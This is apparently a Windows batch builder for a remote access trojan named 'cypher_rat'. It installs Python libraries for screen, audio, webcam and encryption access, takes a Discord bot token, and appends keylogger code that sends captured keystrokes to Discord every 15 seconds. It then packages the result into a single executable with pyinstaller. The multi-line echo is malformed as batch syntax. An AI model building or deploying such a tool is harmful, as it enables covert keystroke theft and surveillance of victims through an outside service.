@echo off

pip install discord.py psutil pyautogui pyaudio opencv-python pycryptodome imageio pyinstaller

pause

set /p user_input=Enter the token:
echo TOKEN = '%user_input%' >> cypher_rat.py
echo with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    threading.Timer(15.0, send_key_to_discord).start()
    bot.run(TOKEN) >> cypher_rat.py

pyinstaller --onefile cypher_rat.py
